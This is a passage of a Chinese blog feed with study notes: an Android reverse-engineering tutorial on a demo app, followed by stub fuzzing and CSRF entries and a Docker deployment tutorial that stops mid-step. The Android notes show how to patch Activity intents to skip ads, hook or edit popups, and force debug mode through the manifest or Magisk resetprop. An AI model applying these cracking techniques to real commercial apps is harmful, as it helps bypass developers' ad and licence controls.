<td align="center">在应用中的一个Activity可以用来表示一个界面，意思可以理解为“活动”，即一个活动开始，代表 Activity组件启动，活动结束，代表一个Activity的生命周期结束。一个Android应用必须通过Activity来运行和启动，Activity的生命周期交给系统统一管理。</td>
</tr>
<tr>
<td align="center">Service(服务)</td>
<td align="center">Service它可以在后台执行长时间运行操作而没有用户界面的应用组件，不依赖任何用户界面，例如后台播放音乐，后台下载文件等。</td>
</tr>
<tr>
<td align="center">Broadcast Receiver(广播接收器)</td>
<td align="center">一个用于接收广播信息，并做出对应处理的组件。比如我们常见的系统广播：通知时区改变、电量低、用户改变了语言选项等。</td>
</tr>
<tr>
<td align="center">Content Provider(内容提供者)</td>
<td align="center">作为应用程序之间唯一的共享数据的途径，Content Provider主要的功能就是存储并检索数据以及向其他应用程序提供访问数据的接口。Android内置的许多数据都是使用Content Provider形式，供开发者调用的（如视频，音频，图片，通讯录等）</td>
</tr>
</tbody></table>
<h4 id="activity的切换"><a href="#activity的切换" class="headerlink" title="activity的切换"></a>activity的切换</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;!---声明实现应用部分可视化界面的 Activity，必须使用 AndroidManifest 中的 &lt;activity&gt; 元素表示所有 Activity。系统不会识别和运行任何未进行声明的Activity。-----&gt;</span><br><span class="line">&lt;activity  </span><br><span class="line">    android:label=<span class="string">&quot;@string/app_name&quot;</span>  </span><br><span class="line">    android:name=<span class="string">&quot;com.zj.wuaipojie.ui.MainActivity&quot;</span>  </span><br><span class="line">    android:exported=<span class="string">&quot;true&quot;</span>&gt;  &lt;!--当前Activity是否可以被另一个Application的组件启动：<span class="literal">true</span>允许被启动；<span class="literal">false</span>不允许被启动--&gt;</span><br><span class="line">    &lt;!---指明这个activity可以以什么样的意图(intent)启动---&gt;</span><br><span class="line">    &lt;intent-filter&gt;  </span><br><span class="line">        &lt;!--表示activity作为一个什么动作启动，android.intent.action.MAIN表示作为主activity启动---&gt;</span><br><span class="line">        &lt;action  </span><br><span class="line">            android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;  </span><br><span class="line">        &lt;!--这是action元素的额外类别信息，android.intent.category.LAUNCHER表示这个activity为当前应用程序优先级最高的Activity--&gt;</span><br><span class="line">        &lt;category  </span><br><span class="line">            android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;  </span><br><span class="line">    &lt;/intent-filter&gt;  </span><br><span class="line">&lt;/activity&gt;  </span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFirst&quot;</span> /&gt;</span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFifth&quot;</span>  </span><br><span class="line">    android:exported=<span class="string">&quot;true&quot;</span> /&gt;  </span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFourth&quot;</span>  </span><br><span class="line">    android:exported=<span class="string">&quot;true&quot;</span> /&gt;  </span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeThird&quot;</span>  </span><br><span class="line">    android:exported=<span class="string">&quot;false&quot;</span> /&gt;  </span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeSecond&quot;</span>  </span><br><span class="line">    android:exported=<span class="string">&quot;false&quot;</span> /&gt;  </span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=<span class="string">&quot;com.zj.wuaipojie.ui.AdActivity&quot;</span> /&gt;  </span><br></pre></td></tr></table></figure>

<p>启动广告流程：<br>启动Activity-&gt;广告Activity-&gt;主页Activity</p>
<p>修改方法：<br>1.修改加载时间<br>2.Acitivity切换定位，修改Intent的Activity类名</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (position) &#123;  </span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:  </span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  </span><br><span class="line">        intent.setClass(it.getContext(), ChallengeFirst.class);  </span><br><span class="line">        it.getContext().startActivity(intent);  </span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:  </span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  </span><br><span class="line">        intent2.setClass(it.getContext(), ChallengeSecond.class);  </span><br><span class="line">        it.getContext().startActivity(intent2);  </span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:  </span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  <span class="comment">//new一个Intent，</span></span><br><span class="line">        intent3.setClass(it.getContext(), AdActivity.class);  <span class="comment">//传入要切换的Acitivity的类名</span></span><br><span class="line">        it.getContext().startActivity(intent3);  <span class="comment">//启动对应的Activity</span></span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:  </span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  </span><br><span class="line">        intent4.setClass(it.getContext(), ChallengeFourth.class);  </span><br><span class="line">        it.getContext().startActivity(intent4);  </span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">    <span class="keyword">default</span>:  </span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Activity生命周期"><a href="#Activity生命周期" class="headerlink" title="Activity生命周期"></a>Activity生命周期</h3><table>
<thead>
<tr>
<th align="center">函数名称</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">onCreate()</td>
<td align="center">一个Activity启动后第一个被调用的函数，常用来在此方法中进行Activity的一些初始化操作。例如创建View，绑定数据，注册监听，加载参数等。</td>
</tr>
<tr>
<td align="center">onStart()</td>
<td align="center">当Activity显示在屏幕上时，此方法被调用但此时还无法进行与用户的交互操作。</td>
</tr>
<tr>
<td align="center">onResume()</td>
<td align="center">这个方法在onStart()之后调用，也就是在Activity准备好与用户进行交互的时候调用，此时的Activity一定位于Activity栈顶，处于运行状态。</td>
</tr>
<tr>
<td align="center">onPause()</td>
<td align="center">这个方法是在系统准备去启动或者恢复另外一个Activity的时候调用，通常在这个方法中执行一些释放资源的方法，以及保存一些关键数据。</td>
</tr>
<tr>
<td align="center">onStop()</td>
<td align="center">这个方法是在Activity完全不可见的时候调用的。</td>
</tr>
<tr>
<td align="center">onDestroy()</td>
<td align="center">这个方法在Activity销毁之前调用，之后Activity的状态为销毁状态。</td>
</tr>
<tr>
<td align="center">onRestart()</td>
<td align="center">当Activity从停止stop状态恢进入start状态时调用状态。</td>
</tr>
</tbody></table>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230319154909284.png" alt="image-20230319154909284" style="zoom:50%;" />

<h3 id="弹窗定位-amp-堆栈分析"><a href="#弹窗定位-amp-堆栈分析" class="headerlink" title="弹窗定位&amp;堆栈分析"></a>弹窗定位&amp;堆栈分析</h3><p>修改方法：<br>1.修改xml中的versiocode<br>2.Hook弹窗(推荐算法助手开启弹窗定位)<br>3.修改dex弹窗代码<br>4.抓包修改响应体(也可以路由器拦截)</p>
<h3 id="布局优化"><a href="#布局优化" class="headerlink" title="布局优化"></a>布局优化</h3><p>1.开发者助手抓布局<br>2.MT管理器xml搜索定位<br>3.修改xml代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android:visibility=&quot;gone&quot;</span><br></pre></td></tr></table></figure>

<h3 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h3><ul>
<li>使用MT分析弹窗的activity</li>
<li>进入classes.dex文件中搜索对应activity</li>
<li>进行对应修改</li>
<li>或者使用算法助手hook弹窗，或者看调用堆栈修改代码</li>
<li>或者开发助手布局查看获取ID，xml搜索进行修改（注意设置ID转名称）</li>
</ul>
<h2 id="1000-7-x3D-？-amp-动态调试-amp-Log插桩"><a href="#1000-7-x3D-？-amp-动态调试-amp-Log插桩" class="headerlink" title="1000-7&#x3D;？&amp;动态调试&amp;Log插桩"></a>1000-7&#x3D;？&amp;动态调试&amp;Log插桩</h2><p><a href="https://www.52pojie.cn/thread-1714727-1-1.html">《安卓逆向这档事》五、1000-7&#x3D;？&amp;动态调试&amp;Log插桩 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>
<p><del>感觉开始上难度了。。。</del></p>
<h3 id="目标-2"><a href="#目标-2" class="headerlink" title="目标"></a>目标</h3><p>了解并掌握动态调试<br>了解并掌握Log插桩</p>
<h3 id="工具-2"><a href="#工具-2" class="headerlink" title="工具"></a>工具</h3><p>教程Demo<br>MT管理器&#x2F;NP管理器<br>jeb（相当于IDA java版）<br>雷电模拟器<br>XappDebug</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>什么是动态调试：动态调试是指自带的调试器跟踪自己软件的运行，可以在调试的过程中知道参数或者局部变量的值以及履清代码运行的先后顺序。多用于爆破注册码(CTF必备技能)</p>
<p>Log插桩:Log插桩指的是反编译APK文件时，在对应的smali文件里，添加相应的smali代码，将程序中的关键信息，以log日志的形式进行输出。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">invoke-<span class="keyword">static</span> &#123;对应寄存器&#125;, Lcom/mtools/LogUtils;-&gt;v(Ljava/lang/Object;)V</span><br></pre></td></tr></table></figure>



<h3 id="动态调试步骤"><a href="#动态调试步骤" class="headerlink" title="动态调试步骤"></a>动态调试步骤</h3><h4 id="修改debug权限"><a href="#修改debug权限" class="headerlink" title="修改debug权限"></a>修改debug权限</h4><p>方法一:在AndroidManifest.xml里添加可调试权限</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">android:debuggable=<span class="string">&quot;true&quot;</span> <span class="comment">//application里面修改</span></span><br></pre></td></tr></table></figure>

<p>方法二：XappDebug模块hook对应的app</p>
<p><a href="https://github.com/Palatis/XAppDebug">XappDebug</a></p>
<p>方法三：Magisk命令(重启失效)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.  adb shell #adb进入命令行模式</span><br><span class="line">2.  su #切换至超级用户</span><br><span class="line">3.  magisk resetprop ro.debuggable 1</span><br><span class="line">4.  stop;start; #一定要通过该方式重启</span><br></pre></td></tr></table></figure>

<p>方法四:刷入MagiskHide Props Config模块(比较麻烦）</p>
<h4 id="端口转发以及开启adb权限"><a href="#端口转发以及开启adb权限" class="headerlink" title="端口转发以及开启adb权限"></a>端口转发以及开启adb权限</h4><p>版本号点击七次开启开发者模式并开启adb调试权限</p>
<p>夜神模拟器：adb connect 127.0.0.1:62001</p>
<h4 id="下段点"><a href="#下段点" class="headerlink" title="下段点"></a>下段点</h4><p>ctrl+b下断点</p>
<h4 id="debug模式启动"><a href="#debug模式启动" class="headerlink" title="debug模式启动"></a>debug模式启动</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell am start -D -n com.zj.wuaipojie/.ui.MainActivity</span><br></pre></td></tr></table></figure>

<p>adb shell am start -D -n<br>adb shell am start -D -n 包名&#x2F;类名<br>am start -n 表示启动一个activity<br>am start -D 表示将应用设置为可调试模式</p>
<h4 id="Jeb附加调试进程"><a href="#Jeb附加调试进程" class="headerlink" title="Jeb附加调试进程"></a>Jeb附加调试进程</h4><p>激活jeb</p>
<p>这章云了。。。</p>
]]></content>
      <tags>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>Fuzzing_study</title>
    <url>/2023/03/08/Fuzzing-study/</url>
    <content><![CDATA[<p>参考：</p>
<p><a href="https://paper.seebug.org/841/">AFL 漏洞挖掘技术漫谈（一）：用 AFL 开始你的第一次 Fuzzing (seebug.org)</a></p>
<p><a href="https://paper.seebug.org/842/">AFL 漏洞挖掘技术漫谈（二）：Fuzz 结果分析和代码覆盖率 (seebug.org)</a></p>
<p><a href="https://www.zhihu.com/question/388240608">(7 封私信 &#x2F; 14 条消息) CS研究生如何入门模糊测试方向？ - 知乎 (zhihu.com)</a></p>
<p><a href="https://www.bilibili.com/video/BV1b7411K7P4/?spm_id_from=333.999.0.0&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">南京大学《软件分析》课程01（Introduction）_哔哩哔哩_bilibili</a></p>
<p><a href="https://tai-e.pascal-lab.net/lectures.html">Static Program Analysis | Tai-e (pascal-lab.net)</a></p>
<p><a href="https://oj.pascal-lab.net/problem">PASCAL OJ (pascal-lab.net)</a></p>
<p>先鸽着，sql学完再来学</p>
]]></content>
      <tags>
        <tag>模糊测试学习</tag>
      </tags>
  </entry>
  <entry>
    <title>csrf实例</title>
    <url>/2023/05/21/csrf%E5%AE%9E%E4%BE%8B/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>docker use</title>
    <url>/2023/03/01/docker/</url>
    <content><![CDATA[<h1 id="Docker学习"><a href="#Docker学习" class="headerlink" title="Docker学习"></a>Docker学习</h1><p>对应大纲：<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301085455109.png" alt="image-20230301085455109" style="zoom:25%;" /></p>
<h3 id="1、初识DOCKER"><a href="#1、初识DOCKER" class="headerlink" title="1、初识DOCKER"></a>1、初识DOCKER</h3><h5 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h5><p>三个环境：开发环境、测试环境、生产环境</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301085726456.png" alt="image-20230301085726456" style="zoom: 25%;" />

<p>环境不同可能会造成问题，手动迁移很麻烦。</p>
<p>可以使用容器来迁移环境，解决软件跨环境迁移问题。</p>
<p>Docker概念：Docker是一个开源的应用容器引擎，容器完全是使用沙箱机制，之间相互隔离，容器性能开销低。分为CE版和EE版</p>
<p>安装docker，本次学习docker安装在centos7上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1、yum 包更新到最新 </span></span><br><span class="line">yum update</span><br><span class="line"><span class="comment"># 2、安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的 </span></span><br><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line"><span class="comment"># 3、 设置yum源</span></span><br><span class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line"><span class="comment"># 4、 安装docker，出现输入的界面都按 y </span></span><br><span class="line">yum install -y docker-ce</span><br><span class="line"><span class="comment"># 5、 查看docker版本，验证是否验证成功</span></span><br><span class="line">docker -v</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301092147712.png" alt="image-20230301092147712"  />

<h5 id="Docker架构"><a href="#Docker架构" class="headerlink" title="Docker架构"></a>Docker架构</h5><p>图片示例：<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301092338599.png" alt="image-20230301092338599" style="zoom: 33%;" /></p>
<p>对应概念：</p>
<ul>
<li><p>镜像（Image）：Docker 镜像（Image），就相当于是 一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包 含了完整的一套 Ubuntu16.04 最小系统的 root 文件系 统。 </p>
</li>
<li><p>容器（Container）：镜像（Image）和容器（Contain er）的关系，就像是面向对象程序设计中的类和对象一 样，镜像是静态的定义，容器是镜像运行时的实体。容 器可以被创建、启动、停止、删除、暂停等。</p>
</li>
</ul>
<p>仓库（Repository）：仓库可看成一个代码控制中心， 用来保存镜像</p>
<h5 id="配置Docker镜像加速器"><a href="#配置Docker镜像加速器" class="headerlink" title="配置Docker镜像加速器"></a>配置Docker镜像加速器</h5><p>使用阿里云镜像加速器</p>
<p>修改daemon配置文件&#x2F;etc&#x2F;docker&#x2F;daemon.json来使用加速器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line">sudo <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://5zu0nxqo.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301093225304.png" alt="image-20230301093225304"></p>
<p>完成</p>
<h3 id="2、Docker命令"><a href="#2、Docker命令" class="headerlink" title="2、Docker命令"></a>2、Docker命令</h3><h5 id="Docker服务相关命令"><a href="#Docker服务相关命令" class="headerlink" title="Docker服务相关命令"></a>Docker服务相关命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">启动docker服务:systemctl start docker </span><br><span class="line">停止docker服务:systemctl stop docker </span><br><span class="line">重启docker服务:systemctl restart docker</span><br><span class="line">查看docker服务状态:systemctl status docker </span><br><span class="line">设置开机启动docker服务:systemctl enable docker</span><br></pre></td></tr></table></figure>

<h5 id="Docker镜像相关命令"><a href="#Docker镜像相关命令" class="headerlink" title="Docker镜像相关命令"></a>Docker镜像相关命令</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">查看镜像: 查看本地所有的镜像</span><br><span class="line">docker images</span><br><span class="line">docker images –q <span class="comment"># 查看所用镜像的id</span></span><br><span class="line"></span><br><span class="line">搜索镜像:从网络中查找需要的镜像</span><br><span class="line">docker search 镜像名称</span><br><span class="line"></span><br><span class="line">拉取镜像:从Docker仓库下载镜像到本地，镜像名称格式为 名称:版本号，如果版本号不指定则是最新的版本。</span><br><span class="line">如果不知道镜像版本，可以去docker hub 搜索对应镜像查看。</span><br><span class="line">docker pull 镜像名称 eg:docker pull redis:3.2</span><br><span class="line"></span><br><span class="line">删除镜像: 删除本地镜像</span><br><span class="line">docker rmi 镜像<span class="built_in">id</span> <span class="comment"># 删除指定本地镜像</span></span><br><span class="line">docker rmi `docker images -q` <span class="comment"># 删除所有本地镜像</span></span><br></pre></td></tr></table></figure>

<p>想要看镜像有哪些版本可以去dockerhub：<a href="https://hub.docker.com/">https://hub.docker.com/</a></p>
<h5 id="Docker容器相关命令"><a href="#Docker容器相关命令" class="headerlink" title="Docker容器相关命令"></a>Docker容器相关命令</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">查看容器</span><br><span class="line">docker ps <span class="comment"># 查看正在运行的容器</span></span><br><span class="line">docker ps –a <span class="comment"># 查看所有容器</span></span><br><span class="line"></span><br><span class="line">创建容器</span><br><span class="line">docker run 参数(可以使用docker run --<span class="built_in">help</span>看对应说明)</span><br><span class="line">-i：保持容器运行。通常与 -t 同时使用。加入it这两个参数后，容器创建后自动进入容器中，退出容器后，容器自动关闭。</span><br><span class="line">• -t：为容器重新分配一个伪输入终端，通常与 -i 同时使用。</span><br><span class="line">• -d：以守护（后台）模式运行容器。创建一个容器在后台运行，需要使用docker <span class="built_in">exec</span> 进入容器。退出后，容器不会关闭。</span><br><span class="line">• -it 创建的容器一般称为交互式容器，-<span class="built_in">id</span> 创建的容器一般称为守护式容器</span><br><span class="line">• --name：为创建的容器命名</span><br><span class="line">docker run -it --name=cl centos:7 /bin/bash</span><br><span class="line">docker run -<span class="built_in">id</span> --name=c2 centos:7 </span><br><span class="line"></span><br><span class="line">进入容器</span><br><span class="line">docker <span class="built_in">exec</span> 参数 <span class="comment"># 退出容器，容器不会关闭</span></span><br><span class="line"></span><br><span class="line">启动容器</span><br><span class="line">docker start 容器名称</span><br><span class="line"></span><br><span class="line">停止容器</span><br><span class="line">docker stop 容器名</span><br><span class="line"></span><br><span class="line">删除容器</span><br><span class="line">docker <span class="built_in">rm</span> 容器名称</span><br><span class="line"></span><br><span class="line">查看容器信息</span><br><span class="line">docker inspect 容器名称</span><br></pre></td></tr></table></figure>

<h3 id="3、Docker容器的数据卷"><a href="#3、Docker容器的数据卷" class="headerlink" title="3、Docker容器的数据卷"></a>3、Docker容器的数据卷</h3><h5 id="数据卷概念及作用"><a href="#数据卷概念及作用" class="headerlink" title="数据卷概念及作用"></a>数据卷概念及作用</h5><p>问题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Docker 容器删除后，在容器中产生的数据也会随之销毁 </span><br><span class="line">Docker 容器和外部机器可以直接交换文件吗？ </span><br><span class="line">容器之间想要进行数据交互？</span><br></pre></td></tr></table></figure>

<p>数据卷：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据卷是宿主机中的一个目录或文件</span><br><span class="line">当容器目录和数据卷目录绑定后，对方的修改会立即同步</span><br><span class="line">一个数据卷可以被多个容器同时挂载</span><br><span class="line">一个容器也可以被挂载多个数据卷</span><br></pre></td></tr></table></figure>

<p>数据卷作用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">容器数据持久化 </span><br><span class="line">外部机器和容器间接通信 </span><br><span class="line">容器之间数据交换</span><br></pre></td></tr></table></figure>



<h5 id="配置数据卷"><a href="#配置数据卷" class="headerlink" title="配置数据卷"></a>配置数据卷</h5><p>创建启动容器时，使用 –v 参数 设置数据卷 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run ... –v 宿主机目录(文件):容器内目录(文件) ...  </span><br><span class="line">注意事项： 1. 目录必须是绝对路径 2. 如果目录不存在，会自动创建 3. 可以挂载多个数据卷</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301101912652.png" alt="image-20230301101912652"></p>
<p>可以看到能够同步，可以简单理解为共享文件夹</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301103733215.png" alt="image-20230301103733215"></p>
<p><strong>如果忘了对应的数据卷可以用inspect看</strong></p>
<h5 id="数据卷容器"><a href="#数据卷容器" class="headerlink" title="数据卷容器"></a>数据卷容器</h5><p>多容器进行数据交换 1. 多个容器挂载同一个数据卷 2. 数据卷容器</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301102705638.png" alt="image-20230301102705638" style="zoom: 67%;" />

<h5 id="配置数据卷容器"><a href="#配置数据卷容器" class="headerlink" title="配置数据卷容器"></a>配置数据卷容器</h5><p>1、创建启动c3数据卷容器，使用 –v 参数 设置数据卷 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run –it --name=c3 –v /volume centos:7 /bin/bash  </span><br></pre></td></tr></table></figure>

<p>2、创建启动 c1 c2 容器，使用 –-volumes-from 参数 设置数据卷</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run –it --name=c1 --volumes-from c3 centos:7 /bin/bash </span><br><span class="line">docker run –it --name=c2 --volumes-from c3 centos:7 /bin/bash </span><br></pre></td></tr></table></figure>

<h3 id="4、Docker应用部署"><a href="#4、Docker应用部署" class="headerlink" title="4、Docker应用部署"></a>4、Docker应用部署</h3><h5 id="MySql部署："><a href="#MySql部署：" class="headerlink" title="MySql部署："></a>MySql部署：</h5><p>需求：在Docker容器中部署MySQL，并通过外部mysql客户端操作MySQL Server。</p>
<p>案例：① 搜索mysql镜像 ② 拉取mysql镜像 ③ 创建容器 ④ 操作容器中的mysql</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当容器中的网络服务需要被外部机器访问时，可以将容器中提供服务的端口映射到宿主机的端口上。外部机 器访问宿主机的该端口，从而间接访问容器的服务。 </span><br><span class="line"></span><br><span class="line">这种操作称为：端口映射</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301105421936.png" alt="image-20230301105421936"></p>
<ol>
<li>搜索mysql镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker search mysql</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>拉取mysql镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull mysql:5.6</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建容器，设置端口映射、目录映射</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在/root目录下创建mysql目录用于存储mysql数据信息</span></span><br><span class="line">mkdir ~/mysql</span><br><span class="line">cd ~/mysql</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -id \</span><br><span class="line">-p 3307:3306 \</span><br><span class="line">--name=c_mysql \</span><br><span class="line">-v $PWD/conf:/etc/mysql/conf.d \</span><br><span class="line">-v $PWD/logs:/logs \</span><br><span class="line">-v $PWD/data:/var/lib/mysql \</span><br><span class="line">-e MYSQL_ROOT_PASSWORD=123456 \</span><br><span class="line">mysql:5.6</span><br></pre></td></tr></table></figure>

<ul>
<li>参数说明：<ul>
<li><strong>-p 3307:3306</strong>：将容器的 3306 端口映射到宿主机的 3307 端口。</li>
<li><strong>-v $PWD&#x2F;conf:&#x2F;etc&#x2F;mysql&#x2F;conf.d</strong>：将主机当前目录下的 conf&#x2F;my.cnf 挂载到容器的 &#x2F;etc&#x2F;mysql&#x2F;my.cnf。配置目录</li>
<li><strong>-v $PWD&#x2F;logs:&#x2F;logs</strong>：将主机当前目录下的 logs 目录挂载到容器的 &#x2F;logs。日志目录</li>
<li><strong>-v $PWD&#x2F;data:&#x2F;var&#x2F;lib&#x2F;mysql</strong> ：将主机当前目录下的data目录挂载到容器的 &#x2F;var&#x2F;lib&#x2F;mysql 。数据目录</li>
<li><strong>-e MYSQL_ROOT_PASSWORD&#x3D;123456：</strong>初始化 root 用户的密码。</li>
</ul>
</li>
</ul>
<ol start="4">
<li>进入容器，操作mysql</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec –it c_mysql /bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301115710533.png" alt="image-20230301115710533"></p>
<ol start="5">
<li>使用外部机器连接容器中的mysql</li>
</ol>
<h5 id="部署Tomcat"><a href="#部署Tomcat" class="headerlink" title="部署Tomcat"></a>部署Tomcat</h5><p>要求：在Docker容器中部署Tomcat，并通过外部机器访问Tomcat部署的项目。</p>
<p>实现步骤 ① 搜索tomcat镜像 ② 拉取tomcat镜像 ③ 创建容器 ④ 部署项目 ⑤ 测试访问</p>
<ol>
<li>搜索tomcat镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker search tomcat</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>拉取tomcat镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull tomcat</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建容器，设置端口映射、目录映射</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在/root目录下创建tomcat目录用于存储tomcat数据信息</span></span><br><span class="line">mkdir ~/tomcat</span><br><span class="line">cd ~/tomcat</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -id --name=c_tomcat \</span><br><span class="line">-p 8080:8080 \</span><br><span class="line">-v $PWD:/usr/local/tomcat/webapps \</span><br><span class="line">tomcat </span><br></pre></td></tr></table></figure>

<ul>
<li><p>参数说明：</p>
<ul>
<li><p><strong>-p 8080:8080：</strong>将容器的8080端口映射到主机的8080端口</p>
<p><strong>-v $PWD:&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps：</strong>将主机中当前目录挂载到容器的webapps</p>
</li>
</ul>
</li>
</ul>
<ol start="4">
<li><p>使用外部机器访问tomcat</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301141233554.png" alt="image-20230301141233554" style="zoom:50%;" />

<p>成功</p>
</li>
</ol>
<h5 id="部署Nginx"><a href="#部署Nginx" class="headerlink" title="部署Nginx"></a>部署Nginx</h5><p>需求：在Docker容器中部署Nginx，并通过外部机器访问Nginx</p>
<p>步骤：① 搜索Nginx镜像 ② 拉取Nginx镜像 ③ 创建容器 ④ 测试访问</p>
<ol>
<li>搜索nginx镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker search nginx</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>拉取nginx镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull nginx</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建容器，设置端口映射、目录映射</li>
</ol>
